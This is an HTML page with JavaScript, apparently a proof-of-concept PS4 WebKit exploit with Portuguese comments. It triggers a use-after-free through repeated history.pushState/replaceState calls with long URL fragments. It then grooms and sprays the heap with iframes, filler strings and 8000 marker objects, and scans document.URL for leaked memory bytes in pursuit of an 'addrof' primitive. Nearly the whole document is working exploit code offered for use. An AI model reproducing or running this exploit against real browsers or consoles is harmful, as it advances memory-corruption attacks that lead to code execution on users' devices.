
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Addrof & Memory Race</title>
<style>
    body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
    button { 
        font-size:14px; padding:12px; margin:5px; 
        background:#222; color:#0f0; border:1px solid #0f0; cursor:pointer; width: 280px; text-align: left;
    }
    button:hover { background:#0f0; color:#000; }
    #log { white-space: pre-wrap; border-top: 1px solid #333; margin-top: 20px; padding-top: 10px; }
    .status { color: #fff; font-weight: bold; }
</style>
</head>
<body>
<h2>PS4 WebKit – Addrof & Memory Race</h2>
<p>Status: <span id="status" class="status">Ready</span></p>

<button onclick="runStepA()">1. FINGERPRINT CHECK</button><br>
<button onclick="runStepB()">2. WINDOWED READ (HEX)</button><br>
<button onclick="runStepC()">3. LAYOUT LOGIC CHECK</button><br>
<button onclick="runStepD()">4. OBJECT ALIGNMENT (ADDROF)</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

window.keepAlive = [];

// --- TRIGGER COM SLEEP AJUSTADO PARA VENCER A URL ---
async function triggerBaseUAF(fastMode = false) {
    logEl.textContent = "";
    window.keepAlive = [];
    statusEl.textContent = "Running UAF Phase...";
    log("=== STARTING STABLE UAF (i < 48) ===");

    let size = 977;
    const STEP = 14461;

    for(let i=0; i<48; i++){
        let char = String.fromCharCode(0x41 + (i % 26));
        let frag = char.repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
        
        size += STEP;
        await sleep(5);
    }

    // AJUSTE: Redução drástica para vencer a escrita da URL na memória
    let waitWindow = fastMode ? 40 : 120;
    let waitGroom = fastMode ? 20 : 80;

    log(">>> UAF WINDOW: " + waitWindow + "ms <<<");
    await sleep(waitWindow);

    let frames = [];
    for(let i=0; i<80; i++){
        let f = document.createElement("iframe");
        document.body.appendChild(f);
        try {
            let d = f.contentDocument;
            d.open();
            d.write("<html><body>" + ("X".repeat(2048)) + "</body></html>");
            d.close();
        } catch(e){}
        frames.push(f);
    }
    frames.forEach(f=>f.remove());
    frames = null;

    log(">>> GROOMING WINDOW: " + waitGroom + "ms <<<");
    await sleep(waitGroom);
}

async function runStepA() { await triggerBaseUAF(false); log("\n[A] Fingerprint..."); let url = document.URL; for(let i=0; i<26; i++){ let p = String.fromCharCode(0x41+i).repeat(10); if(url.includes(p)) log("FOUND: " + p.substring(0,4) + " at " + url.indexOf(p)); } }

async function runStepB() { await triggerBaseUAF(false); log("\n[B] Hex Probe..."); let url = document.URL; [0, 34, 1000, 50000].forEach(off => { if(off < url.length) log("["+off+"]: 0x"+url.charCodeAt(off).toString(16).toUpperCase()); }); }

async function runStepC() { await triggerBaseUAF(false); let old = document.URL.length; location.hash = "#TEST"; await sleep(20); log("Sync Check: " + old + " -> " + document.URL.length); }

// --- PASSO D: O SPRAY AGRESSIVO PARA ADDROF ---
async function runStepD() {
    await triggerBaseUAF(true); 
    log("\n[STEP D] High-Speed Clogging & Spray...");
    statusEl.textContent = "Clogging String Heap...";

    let clogger = [];
    let spray = [];
    
    // 1. Entupindo o alocador de strings (mesmo tamanho da URL)
    let urlDummy = "https://leandrobts.github.io/POC/#PAD"; 
    for(let i = 0; i < 1000; i++) {
        clogger.push(urlDummy + i);
    }

    // 2. Spray agressivo de Objetos (Butterflies)
    statusEl.textContent = "Spraying 8000 Objects...";
    for(let i = 0; i < 8000; i++) {
        let obj = { 
            marker: 0x41424344, // 'ABCD'
            id: i
        };
        // Forçamos o alinhamento de 8 bytes (importante para addrof)
        obj.p1 = 1.1; obj.p2 = 2.2; 
        spray.push(obj);
    }
    
    window.keepAlive = [clogger, spray];

    let url = document.URL;
    log("Scanning offsets 1000 - 5000 (Pós-URL zone)...");
    
    let found = false;
    // IMPORTANTE: Vamos olhar além dos primeiros 100 bytes para fugir da URL
    for(let off = 1000; off < 5000; off++) {
        let code = url.charCodeAt(off);
        
        // Se encontrarmos 0x44 ('D') ou 0x41 ('A'), você venceu!
        if(code !== 0 && code !== 0x56 && code !== 0x20) {
            log("DATA FOUND at [" + off + "]: 0x" + code.toString(16).toUpperCase() + " (" + String.fromCharCode(code) + ")");
            found = true;
            if(found && off > 1100) break; // Evita log infinito
        }
    }
    
    if(!found) log("Ainda lendo 'V' ou Zeros. Aumentando busca...");
    statusEl.textContent = "Analysis Complete";
}
</script>
</body>
</html>
